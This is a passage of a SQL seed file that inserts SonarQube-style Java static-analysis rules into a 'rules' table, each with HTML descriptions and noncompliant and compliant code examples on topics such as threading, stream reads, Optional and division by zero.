<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and
<code>anyValue | 0</code>.</p>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812881, 1510817812881, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (853, 'Packages should have a javadoc file ''package-info.java''', 'S1228', NULL, 'squid', '<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using
javadoc and declare package annotations.</p>
<h2>Compliant Solution</h2>
<pre>
/**
* This package has non null parameters and is documented.
**/
@ParametersAreNonnullByDefault
package org.foo.bar;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'convention', false, 'HTML', 1510817812882, 1510817812882, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (854, '"Threads" should not be used where "Runnables" are expected', 'S2438', NULL, 'squid', '<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are
different, and mixing them is a bad practice that will likely lead to headaches in the future.</p>
<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose
running should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
	public static void main(String[] args) {
		Thread r =new Thread() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
	public static void main(String[] args) {
		Runnable r =new Runnable() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'multi-threading,pitfall', false, 'HTML', 1510817812883, 1510817812883, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (857, '"readObject" should not be "synchronized"', 'S2675', NULL, 'squid', '<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file. It should be
the case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method, and the
<code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing. If this is not the case, the method
should be refactored to make it the case.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private synchronized void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Compliant
  //...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing', false, 'HTML', 1510817812885, 1510817812886, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (858, 'Non-constructor methods should not have the same name as the enclosing class', 'S1223', NULL, 'squid', '<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or
was the methods supposed to be a constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void Foo(String label) {...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void foo(String label) {...}  // Compliant
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812886, 1510817812887, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (859, 'The value returned from a stream read should be checked', 'S2674', NULL, 'squid', '<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value
returned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>
<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned
from the method.</p>
<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not
checked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child
classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    is.read(buffer);  // Noncompliant
    // ...
  } catch (IOException e) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    int count = 0;
    while (count = is.read(buffer) &gt; 0) {
      // ...
    }
  } catch (IOException e) { ... }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/XACSAQ">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an
  array </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert', false, 'HTML', 1510817812888, 1510817812888, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (860, 'Methods should not return constants', 'S3400', NULL, 'squid', '<p>There''s no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a
method call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>
<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int getBestNumber() {
  return 12;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
static int bestNumber = 12;
</pre>
<h2>Exceptions</h2>
<p>Methods with annotations, such as <code>@Override</code> and Spring''s <code>@RequestMapping</code>, are ignored.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817812889, 1510817812890, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (861, '"read" and "readLine" return values should be used', 'S2677', NULL, 'squid', '<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of
action is surely a bug.</p>
<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>,
<code>Reader.read()</code>, and these methods in any child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    while (buffReader.readLine() != null) { // Noncompliant
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    String line = null;
    while ((line = buffReader.readLine()) != null) {
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812891, 1510817812891, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (862, 'Neither "Math.abs" nor negation should be used on numbers that could be "MIN_VALUE"', 'S2676', NULL, 'squid', '<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you''ll
still have a negative number. Since your code is likely to assume that it''s a positive value instead, your results will be unreliable.</p>
<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object''s <code>compareTo</code> method, and
<code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods
is similarly ill-advised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String str) {
  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String str) {
  if (str.hashCode() != 0) {
    // ...
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812892, 1510817812892, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (863, 'Execution of the Garbage Collector should be triggered only by the JVM', 'S1215', NULL, 'squid', '<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what
will be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>
<ul>
  <li> Will the whole application be frozen during the call? </li>
  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>
  <li> Will the JVM simply ignore the call? </li>
  <li> ... </li>
</ul>
<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector should
be left exclusively to the JVM.</p>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'bad-practice,unpredictable', false, 'HTML', 1510817812893, 1510817812893, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (864, 'Constructors should only call non-overridable methods', 'S1699', NULL, 'squid', '<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the
method.</p>
<p>For example:</p>
<ul>
  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>
  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>
  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a
  <code>NullPointerException</code>) can result, because the fields aren''t initialized yet. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  public Parent () {
    doSomething();  // Noncompliant
  }

  public void doSomething () {  // not final; can be overridden
    ...
  }
}

public class Child extends Parent {

  private String foo;

  public Child(String foo) {
    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized
    this.foo = foo;
  }

  public void doSomething () {
    System.out.println(this.foo.length());
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/MYYbAQ">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/TQBi">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or
  destructors </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,pitfall', false, 'HTML', 1510817812894, 1510817812895, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (865, '"null" should not be used with "Optional"', 'S2789', NULL, 'squid', '<p>The concept of <code>Optional</code> is that it will be used when <code>null</code> could cause errors. In a way, it replaces <code>null</code>,
and when <code>Optional</code> is in use, there should never be a question of returning or receiving <code>null</code> from a call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  if (optional != null) {  // Noncompliant
    // do something with optional...
  }
}

@Nullable // Noncompliant
public Optional&lt;String&gt; getOptional() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  optional.ifPresent(
    // do something with optional...
  );
}

public Optional&lt;String&gt; getOptional() {
  // ...
  return Optional.empty();
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'java8', false, 'HTML', 1510817812895, 1510817812896, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (866, 'Arrays should not be created for varargs parameters', 'S3878', NULL, 'squid', '<p>There''s no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.
Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>
is expected makes the intent ambiguous: Is the array supposed to be one object ora collection of objects?</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(new String[] { "s1", "s2"});  // Noncompliant: unnecessary
  doTheThing(new String[12]);  // Compliant
  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous
  // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing("s1", "s2");
  doTheThing(new String[12]);
  doTheOtherThing((Object[]) new String[8]);
   // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812896, 1510817812897, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (963, '"Double.longBitsToDouble" should not be used for "int"', 'S2127', NULL, 'squid', '<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the
mathematical conversion into a <code>double</code> simply won''t work as anticipated because the layout of the bits will be interpreted incorrectly, as
if a child were trying to use an adult''s gloves.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 42;
double d = Double.longBitsToDouble(i);  // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817813010, 1510817813010, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (867, 'Thread.run() should not be called directly', 'S1217', NULL, 'squid', '<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn''t make
sense because it causes its code to be executed in the current thread. </p>
<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.run(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.start(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/572.html">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KQAiAg">CERT THI00-J.</a> - Do not invoke Thread.run() </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,multi-threading', false, 'HTML', 1510817812897, 1510817812898, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (868, 'Methods returns should not be invariant', 'S3516', NULL, 'squid', '<p>When a method is designed to return an invariant value, it may be poor design, but it shouldn''t adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is surely a bug.</p>
<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo(int a) {
  int b = 12;
  if (a == 1) {
    return b;
  }
  return b;  // Noncompliant
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'Per number of return statements', NULL, NULL, false, 'HTML', 1510817812898, 1510817812899, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (869, '"switch" statements should not contain non-case labels', 'S1219', NULL, 'squid', '<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what''s expected
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable
         /* ... */
        break foo;  // this break statement doesn''t relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled "for" statement in a dedicated method
    break;

    /* ... */
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'misra,suspicious', false, 'HTML', 1510817812900, 1510817812900, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (870, 'Zero should not be a possible denominator', 'S3518', NULL, 'squid', '<p>If the denominator to a division or modulo operation is zero it would result in a fatal error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
  }
  z = 1 / z; // Noncompliant, possible division by zero
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
    z = 1;
  }
  z = 1 / z;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/369.html">MITRE, CWE-369</a> - Divide by zero </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KAGyAw">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not
  result in divide-by-zero errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/cAI">CERT, INT33-C.</a> - Ensure that division and remainder operations do not result
  in divide-by-zero errors </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,denial-of-service', false, 'HTML', 1510817812901, 1510817812901, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (871, 'Private fields only used as local variables in methods should become local variables', 'S1450', NULL, 'squid', '<p>When the value of a private field is always assigned to in a class'' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private int singularField;

  public void doSomething(int y) {
    singularField = y + 5;
    ...
    if(singularField == 0 {...}
    ...
  }

  public void doSomethingElse(int y) {
    singularField = y + 3;
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {

  public void doSomething(int y) {
    int singularField = y + 5;
    ...
  }

  public void doSomethingElse(int y) {
    int singularField = y + 3;
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise any issue on annotated field.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812902, 1510817812902, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (872, 'Track lack of copyright and license headers', 'S1451', NULL, 'squid', '<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812903, 1510817812903, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (873, '"@RequestMapping" methods should be "public"', 'S3751', NULL, 'squid', '<p>A <code>@Controller</code> method with a <code>@RequestMapping</code> annotation will be called to handle matching web requests. That will happen
even if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility. </p>
<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring
frameworks ignore visibility in this way. For instance, if you''ve tried to control web access to your sensitive, <code>private</code>,
<code>@RequestMapping</code> method by marking it <code>@Secured</code> ... it will still be called, whether or not the user is authorized to access
it. That''s because AOP proxies are not applied to non-public methods. </p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping("/greet", method = GET)
private String greet(String greetee) {  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@RequestMapping("/greet", method = GET)
public String greet(String greetee) {
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'spring', false, 'HTML', 1510817812905, 1510817812905, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (930, 'Checked exceptions should not be thrown', 'S1162', NULL, 'squid', '<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe
that checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>
<p>This rule verifies that no method throws a new checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod1() throws CheckedException {
  ...
  throw new CheckedException(message);   // Noncompliant
  ...
  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked
}

public void myMethod2() throws CheckedException {  // Compliant; propagation allowed
  myMethod1();
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'error-handling', false, 'HTML', 1510817812968, 1510817812969, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (874, '"equals(Object obj)" should be overridden along with the "compareTo(T obj)" method', 'S1210', NULL, 'squid', '<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>
<blockquote>
  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>
  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>
  <p>The recommended language is "Note: this class has a natural ordering that is inconsistent with equals." </p>
</blockquote>
<p>If this rule is violated, weird and unpredictable failures can occur.</p>
<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on
<code>equals()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
